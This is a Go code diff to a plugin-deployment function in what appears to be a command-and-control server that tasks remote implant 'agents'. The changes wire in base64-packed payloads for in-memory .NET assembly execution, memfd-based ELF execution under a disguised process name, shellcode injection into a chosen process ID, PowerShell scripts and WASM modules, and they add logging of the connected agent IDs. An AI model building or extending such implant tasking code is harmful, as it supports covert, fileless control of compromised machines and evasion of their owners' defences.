@@ -85,25 +85,41 @@ func DeployPlugin(agentID string, pluginID string, args string) (string, error) 
 	switch meta.Type {
 	case "execute-assembly":
 		cmdType = "execute_assembly"
-		// 格式: [app_domain|][args|]base64_data (Data 字段会单独带一份)
-		content = args 
+		// 格式: [app_domain|][args|]base64_data
+		b64Data := base64.StdEncoding.EncodeToString(binData)
+		if args != "" {
+			content = fmt.Sprintf("%s|%s", args, b64Data)
+		} else {
+			content = b64Data
+		}
 	case "memfd-exec":
 		cmdType = "run_memfd_elf"
 		// 格式: [fake_name|]base64_data
-		content = args // 用户可以输入伪装进程名
+		content = fmt.Sprintf("%s|%s", args, base64.StdEncoding.EncodeToString(binData))
 	case "powershell-script":
 		cmdType = "powershell_script"
 		content = args
 	case "shellcode-inject":
 		cmdType = "inject_shellcode"
-		content = args // 格式通常为 PID
+		// 格式: pid|base64_data
+		content = fmt.Sprintf("%s|%s", args, base64.StdEncoding.EncodeToString(binData))
+	case "wasm-skill":
+		cmdType = "wasm_exec"
+		content = args // Expected JSON string as arguments
 	}
 
 	// 4. 封装并发送
 	reqID := uuid.New().String()
 	val, ok := globals.Clients.Load(agentID)
 	if !ok {
-		return "", fmt.Errorf("agent offline")
+		// Debug: Print all active client IDs to help find the mismatch
+		var onlineIDs []string
+		globals.Clients.Range(func(key, value interface{}) bool {
+			onlineIDs = append(onlineIDs, key.(string))
+			return true
+		})
+		log.Printf("[Plugin Error] Agent %s lookup failed. Online agents: %v", agentID, onlineIDs)
+		return "", fmt.Errorf("agent offline (tried: %s)", agentID)
 	}
 	client := val.(*globals.Client)
 
@@ -123,8 +139,8 @@ func DeployPlugin(agentID string, pluginID string, args string) (string, error) 
 		return "", err
 	}
 
-	// [LOGGING] Record plugin execution to DB
-	_ = store.CreateCommandLog(agentID, reqID, "plugin", fmt.Sprintf("[%s] Args: %s", meta.Name, args))
+	// [LOGGING] Record plugin execution to DB (Show actual name instead of generic 'plugin')
+	_ = store.CreateCommandLog(agentID, reqID, meta.Name, fmt.Sprintf("Args: %s", args))
 
 	return reqID, nil
 }
